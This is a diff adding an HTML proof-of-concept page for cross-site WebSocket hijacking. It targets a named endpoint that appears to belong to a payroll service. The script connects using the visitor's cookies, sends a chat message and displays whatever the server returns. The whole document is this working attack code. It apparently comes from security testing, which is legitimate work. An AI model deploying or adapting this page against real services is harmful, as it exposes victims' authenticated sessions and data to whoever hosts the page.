@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>WebSocket Hijack PoC</title>
+</head>
+<body>
+  <h2>WebSocket Hijacking PoC</h2>
+  <pre id="log"></pre>
+
+  <script>
+    function log(msg) {
+      document.getElementById("log").textContent += msg + "\n";
+    }
+
+    // Target WebSocket (replace with actual endpoint)
+    const wsUrl = "wss://penny.payroll.amazon.dev/prod";
+
+    // Try connecting
+    let ws = new WebSocket(wsUrl, [], {
+      headers: {
+        // In real browsers you can't set Cookie manually;
+        // if cookies are not HttpOnly + SameSite=strict, they will be auto-sent.
+      }
+    });
+
+    ws.onopen = () => {
+      log("[*] Connection opened");
+
+      // Example message
+      const payload = {
+        action: "chat",
+        messageType: "TEXT",
+        message: "Hello!"
+      };
+
+      ws.send(JSON.stringify(payload));
+      log("[*] Sent test message");
+    };
+
+    ws.onmessage = (event) => {
+      log("[*] Received: " + event.data);
+    };
+
+    ws.onerror = (err) => {
+      log("[!] Error: " + JSON.stringify(err));
+    };
+
+    ws.onclose = () => {
+      log("[*] Connection closed");
+    };
+  </script>
+</body>
+</html>
